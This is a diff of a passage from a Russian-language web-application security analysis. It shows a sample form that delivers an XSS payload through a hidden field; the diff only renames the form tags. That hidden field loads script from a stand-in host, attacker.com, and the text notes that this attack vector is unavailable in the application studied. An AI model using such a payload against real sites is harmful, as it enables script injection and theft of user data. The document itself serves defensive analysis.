@@ -63,10 +63,11 @@
 или через POST-запрос, например, в заранее подготовленной форме:
 
 <pre>
-<form name=TheForm action=http://myapp.com/page.php method=post>
+<frm name=TheForm action=http://myapp.com/page.php method=post>
 	<input type=hidden name=foo value="<script src=http://attacker.com/bad.js></script>;"/>
-</form>
+</frm>
 </pre>
+
 
 В исследуемом приложении такой вид атаки недоступен.
 
